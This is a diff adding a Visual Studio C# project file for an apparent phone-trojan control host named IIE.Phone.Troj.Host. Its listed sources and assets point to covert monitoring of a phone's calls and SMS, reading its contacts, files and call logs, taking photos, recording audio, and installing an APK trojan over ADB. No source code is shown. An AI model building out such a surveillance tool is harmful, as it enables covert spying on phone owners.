@@ -1,0 +1,287 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{D4BB3C35-924A-4609-B5D1-1C3334DE159B}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>IIE.Phone.Troj.Host</RootNamespace>
+    <AssemblyName>IIE.Phone.Troj.Host</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Management.Instrumentation" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="WangAn.Command, Version=1.0.5232.17136, Culture=neutral, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>lib\WangAn.Command.dll</HintPath>
+    </Reference>
+    <Reference Include="WangAn.Device, Version=1.0.5232.17137, Culture=neutral, processorArchitecture=x86">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>lib\WangAn.Device.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AboutFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="AboutFrm.Designer.cs">
+      <DependentUpon>AboutFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Config.cs" />
+    <Compile Include="get_ataid.cs" />
+    <Compile Include="Handler\AdvInfoHandler.cs" />
+    <Compile Include="Handler\CallLogHandler.cs" />
+    <Compile Include="Handler\CallMonitorHandler.cs" />
+    <Compile Include="Handler\ChannelDistributionHandler.cs" />
+    <Compile Include="Handler\ClientHandler.cs" />
+    <Compile Include="Handler\ClientLogHandler.cs" />
+    <Compile Include="Handler\CommandHandler.cs" />
+    <Compile Include="Handler\ContactsHandler.cs" />
+    <Compile Include="Handler\FileHandler.cs" />
+    <Compile Include="Handler\FileTreeHandler.cs" />
+    <Compile Include="Handler\IPacketHandler.cs" />
+    <Compile Include="Handler\PictureHandler.cs" />
+    <Compile Include="Handler\PreferenceHandler.cs" />
+    <Compile Include="Handler\SMSHandler.cs" />
+    <Compile Include="Handler\SMSMonitorHandler.cs" />
+    <Compile Include="Handler\SoundHandler.cs" />
+    <Compile Include="Handler\TemporaryStorage.cs" />
+    <Compile Include="IConfig.cs" />
+    <Compile Include="ILog.cs" />
+    <Compile Include="IMainView.cs" />
+    <Compile Include="IServer.cs" />
+    <Compile Include="Log.cs" />
+    <Compile Include="MainFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MainFrm.Designer.cs">
+      <DependentUpon>MainFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Model\UserInfo.cs" />
+    <Compile Include="Panel\CallMonitorPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\CallMonitorPanel.Designer.cs">
+      <DependentUpon>CallMonitorPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\CallPhoneFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Panel\CallPhoneFrm.Designer.cs">
+      <DependentUpon>CallPhoneFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\ReadCallLogPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\ReadCallLogPanel.Designer.cs">
+      <DependentUpon>ReadCallLogPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\ReadContractsPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\ReadContractsPanel.Designer.cs">
+      <DependentUpon>ReadContractsPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\ReadFilePanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\ReadFilePanel.Designer.cs">
+      <DependentUpon>ReadFilePanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\ReadSmsPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\ReadSmsPanel.Designer.cs">
+      <DependentUpon>ReadSmsPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\RecordVioceFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Panel\RecordVioceFrm.Designer.cs">
+      <DependentUpon>RecordVioceFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\SendSmsFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Panel\SendSmsFrm.Designer.cs">
+      <DependentUpon>SendSmsFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\SendMessageFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Panel\SendMessageFrm.Designer.cs">
+      <DependentUpon>SendMessageFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\SmsMonitorPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\SmsMonitorPanel.Designer.cs">
+      <DependentUpon>SmsMonitorPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Panel\TakePhotoPanel.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Panel\TakePhotoPanel.Designer.cs">
+      <DependentUpon>TakePhotoPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Server.cs" />
+    <Compile Include="Handler\VideoHandler.cs" />
+    <Compile Include="TrojInstallFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TrojInstallFrm.Designer.cs">
+      <DependentUpon>TrojInstallFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="UserOptionFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="UserOptionFrm.Designer.cs">
+      <DependentUpon>UserOptionFrm.cs</DependentUpon>
+    </Compile>
+    <EmbeddedResource Include="AboutFrm.resx">
+      <DependentUpon>AboutFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MainFrm.resx">
+      <DependentUpon>MainFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\CallMonitorPanel.resx">
+      <DependentUpon>CallMonitorPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\CallPhoneFrm.resx">
+      <DependentUpon>CallPhoneFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\ReadCallLogPanel.resx">
+      <DependentUpon>ReadCallLogPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\ReadContractsPanel.resx">
+      <DependentUpon>ReadContractsPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\ReadFilePanel.resx">
+      <DependentUpon>ReadFilePanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\ReadSmsPanel.resx">
+      <DependentUpon>ReadSmsPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\RecordVioceFrm.resx">
+      <DependentUpon>RecordVioceFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\SendMessageFrm.resx">
+      <DependentUpon>SendMessageFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\SendSmsFrm.resx">
+      <DependentUpon>SendSmsFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\SmsMonitorPanel.resx">
+      <DependentUpon>SmsMonitorPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Panel\TakePhotoPanel.resx">
+      <DependentUpon>TakePhotoPanel.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <EmbeddedResource Include="TrojInstallFrm.resx">
+      <DependentUpon>TrojInstallFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserOptionFrm.resx">
+      <DependentUpon>UserOptionFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="lib\LauncherActivity.apk" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config">
+      <SubType>Designer</SubType>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\InOutTest\InOutTest.csproj">
+      <Project>{289b61fb-7f6a-41ce-9dd5-5a251343caff}</Project>
+      <Name>InOutTest</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\InOut\InOut.csproj">
+      <Project>{6c1895d0-bef2-4a33-a9b0-b6e62cf328cc}</Project>
+      <Name>InOut</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <WCFMetadata Include="Service References\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="lib\AdbWinApi.dll" />
+    <Content Include="lib\AdbWinUsbApi.dll" />
+    <Content Include="lib\System.Data.SQLite.dll" />
+    <Content Include="lib\WA.Common.dll" />
+    <Content Include="lib\WangAn.Command.dll" />
+    <Content Include="lib\WangAn.Device.dll" />
+    <Content Include="lib\wa_adb.exe" />
+    <Content Include="Res\closed-folder.png">
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="Res\file.png">
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="Res\openfolder.gif">
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
